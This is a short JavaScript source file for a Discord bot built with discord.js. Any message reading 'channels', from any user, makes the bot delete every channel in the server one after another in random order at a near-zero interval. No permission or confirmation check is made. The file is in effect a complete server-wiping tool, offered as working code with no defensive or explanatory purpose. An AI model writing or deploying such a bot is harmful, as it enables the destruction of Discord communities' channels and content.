const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

const TOKEN = 'TokenHere';

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async (message) => {
    if (message.content === 'channels') {
        if (!message.guild) return;

        const channels = message.guild.channels.cache;

        if (channels.size === 0) {
            console.log('No channels to delete.');
            return;
        }

        let channelsArray = Array.from(channels.values());

        let deleteInterval = setInterval(() => {
            if (channelsArray.length === 0) {
                clearInterval(deleteInterval);
                console.log('All channels have been deleted.');
                return;
            }

            const randomIndex = Math.floor(Math.random() * channelsArray.length);
            const randomChannel = channelsArray.splice(randomIndex, 1)[0];

            randomChannel.delete('Deleted by a random decision.')
                .then(() => console.log(`${randomChannel.name} has been deleted.`))
                .catch(err => console.log(`Failed to delete ${randomChannel.name}.`));
        }, 0.01);
    }
});

client.login(TOKEN);
